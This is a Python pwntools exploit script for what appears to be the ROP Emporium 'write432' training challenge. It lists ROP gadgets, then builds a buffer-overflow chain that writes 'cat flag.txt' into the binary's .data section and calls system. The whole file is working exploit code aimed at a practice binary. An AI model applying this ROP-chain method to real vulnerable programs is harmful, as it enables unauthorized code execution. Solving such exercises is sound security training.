from pwn import *

'''
ropgadget --binary write432 --only "mov|pop|ret"
Gadgets information
============================================================
0x08048547 : mov al, byte ptr [0xc9010804] ; ret
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080484b0 : mov ebx, dword ptr [esp] ; ret
0x080486db : pop ebp ; ret
0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483e1 : pop ebx ; ret
0x080486da : pop edi ; pop ebp ; ret
0x080486d9 : pop esi ; pop edi ; pop ebp ; ret
0x0804819d : ret
0x080484fe : ret 0xeac1
'''
p = process("./write432")
pop_pop_ret_address = 0x080486da #0x080486da : pop edi ; pop ebp ; ret
mov_ret_address = 0x08048670     #mov dword ptr [edi], ebp ; ret
write_start_address = 0x804a028  #readelf --sections write432 , [25] .data PROGBITS 0804a028 001028 000008 00  WA  0   0  4
system_plt_address = 0x08048430  #gdb> p system
payload = flat(["A"*(0x28+4), pop_pop_ret_address, write_start_address, "cat ", mov_ret_address, pop_pop_ret_address, write_start_address+4, "flag", mov_ret_address, pop_pop_ret_address,write_start_address+8,".txt",mov_ret_address, system_plt_address, "B"*4, write_start_address])
print payload
file = open('payload32','w')
file.write(payload)
p.sendline(payload)
p.interactive()
